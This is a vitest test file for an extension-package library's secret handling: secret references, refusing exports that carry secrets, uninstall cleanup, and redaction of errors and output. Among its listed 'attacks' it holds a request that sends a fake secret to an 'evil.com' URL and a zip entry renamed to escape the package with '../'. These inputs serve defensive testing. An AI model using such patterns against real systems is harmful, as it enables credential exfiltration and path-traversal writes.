import { existsSync } from "node:fs";
import path from "node:path";
import { RecordingEgressSink, secretRef, type Manifest } from "@plumsjs/core";
import { describe, expect, it } from "vitest";
import {
  captureOutput,
  expectNothingWritten,
  FAKE_SECRET as FAKE,
  fixtureManifest,
  fixturePath,
  install,
  serializeError,
  snapshot,
  thrown,
  useWorlds,
  type World,
} from "./contract-helpers.js";
import {
  buildZip,
  expectPlumsError,
  manifestZip,
  renameEntry,
} from "./package-helpers.js";

const world = useWorlds();
const output = captureOutput();

const ID = "test.ext.secretref";
const API = secretRef(ID, "apiKey");
const TEAM = secretRef(ID, "team/token");

class ThrowingEgress extends RecordingEgressSink {
  override async send(): Promise<never> {
    throw new Error(`upstream rejected ${FAKE}`, {
      cause: new Error(`token ${FAKE}`),
    });
  }
}

/** The fixture with a permission of each level and a second secret field whose key needs pointer escaping. */
async function secretManifest(w: World): Promise<Manifest> {
  const base = await fixtureManifest(w, "secret/package-with-secretref.zip");
  return {
    ...base,
    permissions: [
      {
        id: "send",
        level: "egress",
        target: "api.example.com",
        reason: "Send.",
      },
      { id: "save", level: "write", target: "notes", reason: "Save." },
    ],
    settingsSchema: {
      type: "object",
      properties: {
        nickname: {
          type: "string",
          title: "Nickname",
          description: "What to call you.",
        },
        apiKey: {
          type: "string",
          title: "API key",
          description: "Secret key.",
          "x-secret": true,
        },
        "team/token": {
          type: "string",
          title: "Team token",
          description: "Secret token.",
          "x-secret": true,
        },
      },
    },
  };
}

/** The package installed, consented and enabled, with both secret values stored. */
async function armed(
  egress?: ThrowingEgress,
): Promise<World & { manifest: Manifest }> {
  const w = world({
    answers: [true, true, true, true],
    ...(egress ? { egress } : {}),
  });
  const manifest = await secretManifest(w);
  await w.core.importPackage(await manifestZip(manifest));
  await w.core.grantConsent(ID);
  await w.core.enable(ID);
  await w.secrets.set(API, FAKE);
  await w.secrets.set(TEAM, `${FAKE}-team`);
  return Object.assign(w, { manifest });
}

describe("T7: secretRef", () => {
  it.each([
    ["demo-ext", "apiKey", "secret:demo-ext/apiKey"],
    ["a.b_c-d", "team/token", "secret:a.b_c-d/team/token"],
  ])("secretRef(%s, %s) = %s", (id, key, expected) => {
    expect(secretRef(id, key)).toBe(expected);
  });
});

describe("T7: only secrets.set, setSettings and resolveSettings touch real values", () => {
  it("resolveSettings is the one call that returns the value", async () => {
    const w = await armed();
    expect(
      await w.core.setSettings(ID, {
        nickname: "Pat",
        apiKey: API,
        "team/token": TEAM,
      }),
    ).toBeUndefined();
    expect(await w.core.resolveSettings(ID)).toEqual({
      nickname: "Pat",
      apiKey: FAKE,
      "team/token": `${FAKE}-team`,
    });

    const results = [
      await w.core.listInstalled(),
      await w.core.getConsent(ID),
      await w.core.inspect(fixturePath("secret/package-with-secretref.zip")),
      await w.core.validatePackage(
        fixturePath("secret/package-with-secretref.zip"),
      ),
      await w.core.runAction({
        extensionId: ID,
        permissionId: "send",
        request: { url: "https://api.example.com/x" },
      }),
      await w.core.runAction({ extensionId: ID, permissionId: "save" }),
      Buffer.from(
        await w.core.exportPackage({
          manifest: w.manifest,
          files: { "notes.txt": "hello" },
        }),
      ).toString("latin1"),
      w.egress.records,
    ];
    expect(JSON.stringify(results)).not.toContain(FAKE);
  });
});

describe("T7: SECRET_NOT_FOUND", () => {
  const cases: [string, Record<string, unknown>, string, string, string][] = [
    [
      "a plain value in a secret field",
      { apiKey: FAKE },
      "apiKey",
      "NOT_A_SECRET_REF",
      API,
    ],
    ["a non-string value", { apiKey: 123 }, "apiKey", "NOT_A_SECRET_REF", API],
    [
      "another package's ref",
      { apiKey: secretRef("other", "apiKey") },
      "apiKey",
      "NOT_A_SECRET_REF",
      API,
    ],
    [
      "the ref of another field",
      { apiKey: TEAM },
      "apiKey",
      "NOT_A_SECRET_REF",
      API,
    ],
    [
      "a ref with no stored value (key needs escaping)",
      { "team/token": TEAM },
      "team/token",
      "NOT_FOUND",
      TEAM,
    ],
  ];

  it.each(cases)(
    "setSettings with %s: details, no echo, nothing written",
    async (_name, values, key, reason, ref) => {
      const w = world();
      await w.core.importPackage(await manifestZip(await secretManifest(w)));
      await w.secrets.set(API, FAKE);
      const before = await snapshot(w);
      const err = await expectPlumsError(
        w.core.setSettings(ID, values),
        "SECRET_NOT_FOUND",
        `/settings/${key.replace("/", "~1")}`,
      );
      expect(err.details).toEqual({ id: ID, key, secretRef: ref, reason });
      expect(serializeError(err)).not.toContain(FAKE);
      expect(await snapshot(w)).toEqual(before);
      expect(
        existsSync(path.join(w.dataDir, "data", ID, "settings.json")),
      ).toBe(false);
    },
  );

  it("resolveSettings fails once a stored value is gone", async () => {
    const w = await armed();
    await w.core.setSettings(ID, { apiKey: API });
    await w.secrets.delete(API);
    const err = await expectPlumsError(
      w.core.resolveSettings(ID),
      "SECRET_NOT_FOUND",
      "/settings/apiKey",
    );
    expect(err.details).toEqual({
      id: ID,
      key: "apiKey",
      secretRef: API,
      reason: "NOT_FOUND",
    });
  });
});

describe("T7: export refuses to carry a stored secret", () => {
  const rejected: [
    string,
    (m: Manifest) => Parameters<World["core"]["exportPackage"]>[0],
    string | undefined,
  ][] = [
    [
      "the manifest",
      (m) => ({ manifest: { ...m, payload: { note: `key ${FAKE}` } } }),
      "manifest.json",
    ],
    [
      "a text file",
      (m) => ({ manifest: m, files: { "notes.txt": `x ${FAKE} y` } }),
      "notes.txt",
    ],
    [
      "a binary file",
      (m) => ({
        manifest: m,
        files: { "blob.bin": Buffer.from(`\0${FAKE}\0`) },
      }),
      "blob.bin",
    ],
    [
      "a file name",
      (m) => ({ manifest: m, files: { [`${FAKE}.txt`]: "x" } }),
      undefined,
    ],
  ];

  it.each(rejected)(
    "a secret in %s is IMPORT_INVALID, names only the file, writes no zip",
    async (_name, input, file) => {
      const w = await armed();
      const outPath = path.join(w.parent, "out.zip");
      const err = await expectPlumsError(
        w.core.exportPackage(input(w.manifest), { outPath }),
        "IMPORT_INVALID",
      );
      if (file !== undefined) expect(err.message).toContain(file);
      expect(serializeError(err)).not.toContain(FAKE);
      expect(existsSync(outPath)).toBe(false);
    },
  );

  it("the TT1 package that carries the fake secret in its payload cannot be exported once the secret is stored", async () => {
    const w = world();
    const id = await install(
      w,
      "secret/package-with-fake-secret-in-settings.zip",
    );
    const manifest = await fixtureManifest(
      w,
      "secret/package-with-fake-secret-in-settings.zip",
    );
    await w.core.exportPackage({ manifest });
    await w.secrets.set(secretRef(id, "apiKey"), FAKE);
    const err = await expectPlumsError(
      w.core.exportPackage({ manifest }),
      "IMPORT_INVALID",
    );
    expect(serializeError(err)).not.toContain(FAKE);
  });
});

describe("T7: an x-secret field cannot carry a value in the package", () => {
  const allowed = {
    type: "string" as const,
    title: "API key",
    description: "Stored as a ref.",
    "x-secret": true,
  };

  it("the only allowed keys are type, title, description and x-secret", async () => {
    const w = world();
    const manifest = await secretManifest(w);
    const ok = {
      ...manifest,
      settingsSchema: {
        type: "object" as const,
        properties: { apiKey: allowed },
      },
    };
    const zip = await manifestZip(ok);
    expect((await w.core.importPackage(zip)).manifest.settingsSchema).toEqual(
      ok.settingsSchema,
    );
    expect(await w.core.inspect(zip)).toMatchObject({ id: manifest.id });
    expect((await w.core.validatePackage(zip)).manifest.settingsSchema).toEqual(
      ok.settingsSchema,
    );
    expect(
      (
        await w.core.validatePackage(
          await w.core.exportPackage({ manifest: ok }),
        )
      ).manifest.settingsSchema,
    ).toEqual(ok.settingsSchema);
  });

  it("any other key, including a nested properties object and $ref, is MANIFEST_INVALID", async () => {
    const forbidden: [string, unknown][] = [
      ["default", FAKE],
      ["const", FAKE],
      ["enum", [FAKE]],
      ["examples", [FAKE]],
      ["oneOf", [{ const: FAKE }]],
      ["$ref", "#/definitions/apiKey"],
      ["pattern", FAKE],
      ["x-default", FAKE],
      ["properties", { type: "string" }],
    ];
    for (const [keyword, value] of forbidden) {
      const w = world();
      const manifest = await secretManifest(w);
      const bad = {
        ...manifest,
        settingsSchema: {
          type: "object" as const,
          properties: { apiKey: { ...allowed, [keyword]: value } },
        },
      };
      const zip = await manifestZip(bad);
      const pointer = `/settingsSchema/properties/apiKey/${keyword.replace("/", "~1")}`;
      for (const call of [
        () => w.core.importPackage(zip),
        () => w.core.inspect(zip),
        () => w.core.validatePackage(zip),
        () => w.core.exportPackage({ manifest: bad }),
      ]) {
        const err = await expectPlumsError(call(), "MANIFEST_INVALID", pointer);
        expect(serializeError(err)).not.toContain(FAKE);
      }
      expectNothingWritten(w);
    }
  });

  it('a non-boolean x-secret such as "true" is MANIFEST_INVALID and is not stored as a secret', async () => {
    const w = world();
    const manifest = await secretManifest(w);
    const bad = {
      ...manifest,
      settingsSchema: {
        type: "object" as const,
        properties: {
          apiKey: {
            type: "string" as const,
            title: "API key",
            description: "Secret key.",
            "x-secret": "true" as never,
          },
        },
      },
    };
    await expectPlumsError(
      w.core.importPackage(await manifestZip(bad)),
      "MANIFEST_INVALID",
      "/settingsSchema/properties/apiKey/x-secret",
    );
    expect(await w.core.listInstalled()).toEqual([]);
    expect(
      await w.secrets.get(secretRef(manifest.id, "apiKey")),
    ).toBeUndefined();
  });

  it("a value on a field that is not x-secret is fine", async () => {
    const w = world();
    const manifest = await secretManifest(w);
    const ok = {
      ...manifest,
      settingsSchema: {
        type: "object" as const,
        properties: {
          nickname: {
            type: "string" as const,
            title: "Nickname",
            description: "What to call you.",
            default: "Pat",
          },
        },
      },
    };
    await w.core.importPackage(await manifestZip(ok));
  });
});

describe("T7: uninstall", () => {
  it("deletes this package's secret values and nothing else, and leaves a clean slate", async () => {
    const w = await armed();
    await w.secrets.set("unrelated/key", "keep");
    await w.core.setSettings(ID, { apiKey: API });
    await w.core.uninstall(ID);
    expect([await w.secrets.get(API), await w.secrets.get(TEAM)]).toEqual([
      undefined,
      undefined,
    ]);
    expect(await w.secrets.get("unrelated/key")).toBe("keep");
    await expectPlumsError(w.core.resolveSettings(ID), "PERMISSION_DENIED");
  });

  it("another package's secrets survive", async () => {
    const w = await armed();
    const manifest = await secretManifest(w);
    await w.core.importPackage(
      await manifestZip({ ...manifest, id: "other.pack" }),
    );
    await w.secrets.set(secretRef("other.pack", "apiKey"), "other-value");
    await w.core.uninstall(ID);
    expect(await w.secrets.get(secretRef("other.pack", "apiKey"))).toBe(
      "other-value",
    );
  });
});

describe("T7: redaction (acceptance 6): errors, exported files and process output never show a stored secret", () => {
  type Armed = World & { manifest: Manifest };
  const bad = (w: Armed, patch: Partial<Manifest>) =>
    manifestZip({ ...w.manifest, ...patch });

  const badZips: [string, (w: Armed) => Promise<Uint8Array>][] = [
    [
      "a manifest that is not JSON",
      () => buildZip([{ name: "manifest.json", data: `{ ${FAKE}` }]),
    ],
    ["a bad kind", (w) => bad(w, { kind: FAKE as never })],
    ["a bad id", (w) => bad(w, { id: FAKE })],
    ["a bad format version", (w) => bad(w, { formatVersion: FAKE })],
    [
      "a bad egress target",
      (w) =>
        bad(w, {
          permissions: [
            { id: "p", level: "egress", target: `${FAKE}/x`, reason: "r" },
          ],
        }),
    ],
    [
      "an entry that escapes the package",
      async (w) =>
        renameEntry(
          await manifestZip(w.manifest, [{ name: `.x/${FAKE}`, data: "x" }]),
          `.x/${FAKE}`,
          `../${FAKE}`,
        ),
    ],
  ];

  const attacks: [string, (w: Armed) => Promise<unknown>][] = [
    [
      "exportPackage with a secret in a file name",
      (w) =>
        w.core.exportPackage({
          manifest: w.manifest,
          files: { [`${FAKE}.txt`]: "x" },
        }),
    ],
    [
      "exportPackage with a secret in the payload",
      (w) =>
        w.core.exportPackage({ manifest: { ...w.manifest, payload: FAKE } }),
    ],
    [
      "exportPackage with a secret in the kind",
      (w) =>
        w.core.exportPackage({
          manifest: { ...w.manifest, kind: FAKE as never },
        }),
    ],
    ["grantConsent with the secret as id", (w) => w.core.grantConsent(FAKE)],
    ["getConsent with the secret as id", (w) => w.core.getConsent(FAKE)],
    ["enable with the secret as id", (w) => w.core.enable(FAKE)],
    ["disable with the secret as id", (w) => w.core.disable(FAKE)],
    ["uninstall with the secret as id", (w) => w.core.uninstall(FAKE)],
    [
      "runAction with the secret as extension id",
      (w) => w.core.runAction({ extensionId: FAKE, permissionId: "send" }),
    ],
    [
      "runAction with the secret as permission id",
      (w) => w.core.runAction({ extensionId: ID, permissionId: FAKE }),
    ],
    [
      "runAction with the secret in the url",
      (w) =>
        w.core.runAction({
          extensionId: ID,
          permissionId: "send",
          request: { url: `https://evil.com/${FAKE}` },
        }),
    ],
    [
      "runAction when the sink throws the secret",
      (w) =>
        w.core.runAction({
          extensionId: ID,
          permissionId: "send",
          request: { url: "https://api.example.com/x" },
        }),
    ],
    ["setSettings with the secret as id", (w) => w.core.setSettings(FAKE, {})],
    [
      "setSettings with the secret as value",
      (w) => w.core.setSettings(ID, { apiKey: FAKE }),
    ],
    [
      "resolveSettings with the secret as id",
      (w) => w.core.resolveSettings(FAKE),
    ],
  ];

  it.each([
    "validatePackage",
    "inspect",
    "importPackage",
    "updatePackage",
  ] as const)(
    "%s refuses a bad package without showing a stored secret",
    async (method) => {
      for (const [, build] of badZips) {
        const w = await armed(new ThrowingEgress());
        const text = serializeError(
          await thrown(w.core[method](await build(w))),
        );
        expect(text).not.toContain(FAKE);
        expect(text).not.toContain(`${FAKE}-team`);
        expect(output.lines.join("\n")).not.toContain(FAKE);
      }
    },
  );

  it.each(attacks)("%s", async (_name, attack) => {
    const w = await armed(new ThrowingEgress());
    const text = serializeError(await thrown(attack(w)));
    expect(text).not.toContain(FAKE);
    expect(text).not.toContain(`${FAKE}-team`);
    expect(output.lines.join("\n")).not.toContain(FAKE);
  });

  it("the exported package holds no secret in any file content or file name", async () => {
    const w = await armed();
    await w.core.setSettings(ID, { apiKey: API, "team/token": TEAM });
    const bytes = await w.core.exportPackage({
      manifest: w.manifest,
      files: { "notes.txt": "hello", "dir/more.txt": "world" },
    });
    const { manifest, files } = await w.core.validatePackage(bytes);
    const seen = [
      Buffer.from(bytes).toString("latin1"),
      "manifest.json",
      JSON.stringify(manifest),
      ...Object.keys(files),
      ...Object.values(files).map((f) => Buffer.from(f).toString("latin1")),
    ];
    expect(Object.keys(files).sort()).toEqual(["dir/more.txt", "notes.txt"]);
    for (const text of seen) expect(text).not.toContain(FAKE);
  });

  it("nothing reaches console, stdout or stderr during a full run (and the capture is live)", async () => {
    console.log("probe-log");
    process.stderr.write("probe-stderr");
    expect(output.lines).toEqual(
      expect.arrayContaining(["probe-log", "probe-stderr"]),
    );
    output.lines.length = 0;

    const w = await armed(new ThrowingEgress());
    await w.core.setSettings(ID, { apiKey: API });
    await w.core.resolveSettings(ID);
    await w.core.exportPackage({ manifest: w.manifest });
    await expect(
      w.core.runAction({
        extensionId: ID,
        permissionId: "send",
        request: { url: "https://api.example.com/x" },
      }),
    ).rejects.toThrow(/^upstream rejected /);
    await w.core.runAction({ extensionId: ID, permissionId: "save" });
    await w.core.uninstall(ID);
    expect(output.lines.join("\n")).not.toContain(FAKE);
  });
});
